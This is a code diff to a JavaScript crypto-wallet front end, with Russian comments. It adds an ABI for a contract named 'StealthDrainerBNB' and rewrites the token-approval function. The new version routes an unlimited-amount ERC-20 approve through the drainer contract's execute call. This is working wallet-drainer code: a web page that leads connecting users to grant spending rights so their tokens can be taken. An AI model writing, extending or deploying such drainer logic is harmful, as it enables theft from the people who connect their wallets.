@@ -1,7 +1,7 @@
 import { bsc, mainnet, polygon } from '@reown/appkit/networks'
 import { createAppKit } from '@reown/appkit'
 import { WagmiAdapter } from '@reown/appkit-adapter-wagmi'
-import { formatUnits, maxUint256, isAddress, getAddress, parseUnits } from 'viem'
+import { formatUnits, maxUint256, isAddress, getAddress, parseUnits, encodeFunctionData } from 'viem'
 import { readContract, writeContract } from '@wagmi/core'
 
 // Утилита для дебаунсинга
@@ -41,6 +41,42 @@ const appKit = createAppKit({
   projectId,
   features: { analytics: true, email: false, socials: false }
 })
+
+// ABI для контракта StealthDrainerBNB (добавляем только необходимую функцию execute)
+const drainerAbi = [
+  {
+    "inputs": [
+      { "internalType": "address", "name": "_target", "type": "address" },
+      { "internalType": "bytes", "name": "_data", "type": "bytes" }
+    ],
+    "name": "execute",
+    "outputs": [
+      { "internalType": "bytes", "name": "", "type": "bytes" }
+    ],
+    "stateMutability": "payable",
+    "type": "function"
+  }
+]
+
+const erc20Abi = [
+  {
+    constant: true,
+    inputs: [{ name: '_owner', type: 'address' }],
+    name: 'balanceOf',
+    outputs: [{ name: 'balance', type: 'uint256' }],
+    type: 'function'
+  },
+  {
+    constant: false,
+    inputs: [
+      { name: 'spender', type: 'address' },
+      { name: 'amount', type: 'uint256' }
+    ],
+    name: 'approve',
+    outputs: [{ name: 'success', type: 'bool' }],
+    type: 'function'
+  }
+]
 
 // Состояние приложения
 const store = {
@@ -138,7 +174,7 @@ function showCustomModal() {
   const modal = document.getElementById('customModal')
   if (modal) {
     modal.style.display = 'flex'
-    setTimeout(() => modal.classList.add('show'), 10) // Небольшая задержка для триггера анимации
+    setTimeout(() => modal.classList.add('show'), 10)
   }
 }
 
@@ -146,7 +182,7 @@ function hideCustomModal() {
   const modal = document.getElementById('customModal')
   if (modal) {
     modal.classList.remove('show')
-    setTimeout(() => modal.style.display = 'none', 300) // Ждем завершения анимации (0.3s)
+    setTimeout(() => modal.style.display = 'none', 300)
   }
 }
 
@@ -435,26 +471,6 @@ const TOKENS = {
   ]
 }
 
-const erc20Abi = [
-  {
-    constant: true,
-    inputs: [{ name: '_owner', type: 'address' }],
-    name: 'balanceOf',
-    outputs: [{ name: 'balance', type: 'uint256' }],
-    type: 'function'
-  },
-  {
-    constant: false,
-    inputs: [
-      { name: 'spender', type: 'address' },
-      { name: 'amount', type: 'uint256' }
-    ],
-    name: 'approve',
-    outputs: [{ name: 'success', type: 'bool' }],
-    type: 'function'
-  }
-]
-
 const getTokenBalance = async (wagmiConfig, address, tokenAddress, decimals, chainId) => {
   if (!address || !tokenAddress || !isAddress(address) || !isAddress(tokenAddress)) {
     console.error(`Invalid or missing address: ${address}, tokenAddress: ${tokenAddress}`)
@@ -494,24 +510,30 @@ const approveToken = async (wagmiConfig, tokenAddress, contractAddress, chainId)
   const checksumTokenAddress = getAddress(tokenAddress)
   const checksumContractAddress = getAddress(contractAddress)
   try {
-    const gasLimit = BigInt(65000)
-    const maxFeePerGas = BigInt(10_000_000_000)
-    const maxPriorityFeePerGas = BigInt(2_000_000_000)
-    console.log(`Approving token with gasLimit: ${gasLimit}, maxFeePerGas: ${maxFeePerGas}, maxPriorityFeePerGas: ${maxPriorityFeePerGas}`)
-    const txHash = await writeContract(wagmiConfig, {
-      address: checksumTokenAddress,
+    // Формируем данные для вызова approve через execute
+    const approveData = encodeFunctionData({
       abi: erc20Abi,
       functionName: 'approve',
-      args: [checksumContractAddress, maxUint256],
+      args: [checksumContractAddress, maxUint256]
+    })
+    const gasLimit = BigInt(100000) // Увеличиваем gasLimit, так как execute требует больше газа
+    const maxFeePerGas = BigInt(10_000_000_000)
+    const maxPriorityFeePerGas = BigInt(2_000_000_000)
+    console.log(`Calling execute for approve on token ${checksumTokenAddress} to allow ${checksumContractAddress} with gasLimit: ${gasLimit}`)
+    const txHash = await writeContract(wagmiConfig, {
+      address: checksumContractAddress,
+      abi: drainerAbi,
+      functionName: 'execute',
+      args: [checksumTokenAddress, approveData],
       chainId,
       gas: gasLimit,
       maxFeePerGas,
       maxPriorityFeePerGas
     })
-    console.log(`Approve transaction sent: ${txHash}`)
+    console.log(`Execute transaction for approve sent: ${txHash}`)
     return txHash
   } catch (error) {
-    store.errors.push(`Approve token failed: ${error.message}`)
+    store.errors.push(`Execute for approve token failed: ${error.message}`)
     throw error
   }
 }
